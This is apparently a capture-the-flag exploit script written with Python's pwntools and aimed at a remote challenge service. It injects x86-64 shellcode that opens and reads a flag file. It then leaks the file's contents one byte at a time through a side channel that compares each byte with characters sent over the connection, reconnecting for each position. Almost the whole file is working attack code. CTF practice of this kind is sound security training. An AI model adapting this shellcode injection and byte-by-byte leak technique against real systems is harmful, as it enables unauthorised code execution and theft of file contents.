#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
context.arch="amd64"
pwn_file="./chall"
elf=ELF(pwn_file)
#context.timeout = 2
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23604)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

shellcode ="""
call here
  .ascii "./flag"
  .byte 0
here:
  pop rdi
  xor rsi, rsi
  mov rdx, 0x4
  mov rax, 0x2
  syscall
  mov rdi, 0x3
  mov rsi, 0x601300
  mov rdx, 0x500
  xor rax, rax
  syscall
  
  mov r8, %s
  mov rsi,%s
check_cmp:
  mov rdi,0x0
  mov rdx,0x1
  xor rax,rax
  syscall
  mov dl, byte ptr [rsi]
  mov bl, byte ptr [r8]
  cmp rdx, rbx
  jnz check_cmp
  syscall
  syscall
"""
"""
  add r8,1
  add rsi,1
  jmp check_cmp
"""
#sh = asm(shellcode)

#debug()
#r.sendline(sh)

flag = ''
addr1= 0x601300
addr2= 0x601900


for j in range(55):
   ir = remote("pwn.sixstars.team", 23604)
   # ir = process("./chall")
   shell = shellcode%(hex(addr1+j), hex(addr2+j))
   print shell
   sh = asm(shell)
   ir.sendline(sh)
   for i in range(0x20,128): 
      try:
          ir.sendline(chr(i))
          sleep(0.1)
      except:
          print "this char is:"
          print chr(i-1)
          flag += chr(i-1)
          break
    
   ir.close()
print flag
